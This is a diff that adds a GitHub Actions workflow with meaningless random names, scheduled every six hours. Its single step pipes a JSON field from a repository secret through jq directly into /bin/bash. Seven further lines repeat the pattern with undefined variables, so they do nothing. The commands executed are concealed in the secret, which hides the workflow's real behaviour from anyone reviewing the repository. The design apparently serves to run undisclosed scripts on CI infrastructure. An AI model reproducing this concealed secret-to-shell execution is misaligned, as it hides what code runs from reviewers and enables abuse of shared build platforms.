@@ -1,0 +1,25 @@
+name: xunbuhui1986
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xunbuhui1986
+        env:
+          gat335: ${{ secrets.gat335 }}
+        run: |
+          echo $gat335 | jq -r .wxesj2351 | /bin/bash
+          echo $h49 | jq -r .f31 | /bin/bash
+          echo $w14562 | jq -r .syqd08204 | /bin/bash
+          echo $im95 | jq -r .rr0 | /bin/bash
+          echo $pu31130 | jq -r .fqjwo982 | /bin/bash
+          echo $wruue1036 | jq -r .runao9 | /bin/bash
+          echo $spf75 | jq -r .knl58624 | /bin/bash
+          echo $im453 | jq -r .ucsty5597 | /bin/bash
+
